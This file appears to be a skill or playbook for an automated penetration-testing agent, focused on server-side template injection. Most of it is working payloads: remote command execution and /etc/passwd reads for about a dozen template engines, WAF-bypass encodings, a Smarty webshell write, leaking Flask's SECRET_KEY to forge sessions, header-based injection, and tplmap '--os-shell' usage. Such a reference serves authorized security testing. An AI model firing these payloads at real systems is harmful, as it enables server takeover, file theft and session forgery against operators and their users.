---
name: ssti
description: >-
  SSTI — template engines (Jinja2/Twig/Smarty/FreeMarker/Velocity/Thymeleaf/Pebble/ERB/
  Angular client) → RCE or file read. Auto-invoke when: `{{7*7}}`→49 or `${...}` echoed,
  template metachars render arithmetic, error pages reveal engine names, profile/name/
  email fields render server-side templates. Do NOT load for: client-side echo only →
  `xss`; command-string sinks → `rce`.
family: differential
severity: high → critical
---

# SSTI — detect · fingerprint · escape → RCE

> **Arsenal:** server-side code execution via the template engine's expression context.
> **Sibling:** `rce` (command injection family), `xss` (client-only echo), `info_disclosure`
> (leaks feeding payloads).
> **Proof bar:** code execution effect — command output in-band, file read, or OOB
> callback — proven on the target. Arithmetic echo (`{{7*7}}`→49) is the DETECTION
> gate, not the proof.
> **Setup:** one field rendered by server templates (profile bio, name, email, error handler, PDF body).

## WAF Bypass (SSTI)
- Syntax gates: `{{ }}` banned → try `${ }`, `<%= %>`, `#{ }`, `${{ }}`, `{% %}` (block tags), `#{7*7}` (Smarty)
- Encoded: `%7b%7b7*7%7d%7d`, double-encode, unicode braces `｛｝` (node parser), `\x7b` in JS engines
- Whitespace/newline inside braces: `{{\n7*7\n}}` past regexes; comment stuffing `{{'a'*7}}`
- Broken-escape: `{{` vs `{{` with backticks; nested evaluation `${{7*7}}` (Jinja inside JS string)
- Multi-engine shotgun: send EVERY family's math probe in ONE batch, read which renders (fingerprint first!)

## Context
- SSTI needs the input to reach an EXPRESSION-evaluating engine — not just string interpolation.
  Use-case triggers: marketing email builders (MJML/Handlebars), invoice/PDF renderers (Thymeleaf),
  page-builder CMS (Twig/Smarty), error pages (Flask/Jinja2 debug), Zendesk-like ticket templates.
- Fingerprint engine from error text (`jinja2.exceptions.UndefinedError`, `Twig_Error`, `freemarker.core...`),
  response headers, or which syntax evalua.

## General Techniques
- **Detection battery (one pass):** `{{7*7}}` `${7*7}` `<%= 7*7 %>` `#{7*7}` `${{7*7}}` `{%7*7%}` — which renders 49?
- **Jinja2 RCE:** `{{config.__class__.__init__.__globals__['os'].popen('id').read()}}` (config-based)
  or `{{ lipsum.__globals__['os'].popen('id').read() }}`
- **Jinja2 file read:** `{{config.__class__.__init__.__globals__['__builtins__'].open('/etc/passwd').read()}}`
- **Twig:** `{{['id']|filter('system')}}` / `{{_self.env.registerUndefinedFilterCallback('system')}}{{_self.env.getFilter('id')}}`
- **Twig file read:** `{{['/etc/passwd']|filter('file_get_contents')}}` (registerUndefinedFilterCallback family)
- **Smarty:** `{system('id')}` (Smarty 3 `{Smarty_Internal_Write_File}` write-into-cache → webshell)
- **FreeMarker:** `<#assign ex="freemarker.template.utility.Execute"?new()>${ex("id")}`
- **Velocity:** `#set($x="")#set($rt=$x.class.forName("java.lang.Runtime"))#set($ex=$rt.getRuntime().exec("id"))`
- **Thymeleaf:** `__${T(java.lang.Runtime).getRuntime().exec('id')}__` (expression preprocessor)
- **Pebble:** `"".getClass().forName("java.lang.Runtime").getRuntime().exec("id")`
- **ERB (Ruby):** `<%= system('id') %>` / `<%= IO.popen('id').read %>`
- **EL/JSF:** `${pageContext.request.getSession().setAttribute("x",Runtime.getRuntime().exec("id"))}` (URL/body params)
- **Angular CSTI:** `{{constructor.constructor('alert(1)')()}}` (client-side — still code-exec impact; boundary to xss)
- **Jinjava (HubL):** `{{"".getClass().forName("javax.script.ScriptEngineManager")...}}` scripting

## Second-Order & Bypass Techniques
- Store payload in field A, template renders it on field B (profile → email/PDF); second sink is the rodeo
- Engine escapes `{{` via regex → use `{%` block syntax with `set`/`do` (Jinja `{% set x = ... %}`)
- filter/sort/map callback smuggling (Twig `|map(function)`, `|sort` with callbacks)
- String construction: blocked literal chars → `['a','b']|join` / `chr(105)`-style intrinsics

## Auth Bypass Techniques
- Template vars leak config: `{{config}}` (Flask) — SECRET_KEY, keys → forge session (→ `jwt`/`authentication`)
- Freemarker/Velocity on admin-rendered routes: authenticated-but-low-priv template inject → privesc

## Header Techniques
- Some engines render headers into templates (theme selection `X-Theme`, `Accept-Language`) — inject expression as header value
- Error-handler templates rendering `Host`/`Referer` → payload via Host header

## CVE on Sight
| CVE | Surface | Class |
|---|---|---|
| CVE-2022-27580 | Hybris/SAP Commerce | SSTI RCE |
| CVE-2021-37671 | Node.js Express-Handlebars | SSTI via param |
| CVE-2019-16759 | vBulletin | pre-auth SSTI RCE (classic) |
| CVE-2020-15148 | Yii2 (php) | passthru via sanitizer escape |

## Indicators — record as `possible` when seen
- `{{7*7}}` or `${...}` mathematically echoed · error pages containing `jinja2`/`twig`/`freemarker`/`velocity`/"undefined variable"
- Template-driven render contexts (page builder, invoice, email preview, PDF) accepting arbitrary text
- Angular/Vue `{{ }}` in raw HTML response (client) — mark possible, boundary → xss

## Tools
- `curl -s -X POST -d 'name={{7*7}}' URL/profile` — arithmetic gate for every render field
- PayloadHost TPLMAP / tplmap (`tplmap -u URL --os-shell`) — confirm by hand, engine by engine
- `ffuf` with detection battery: `-w payloads.txt -fr '49'` won't help — check per-field with curl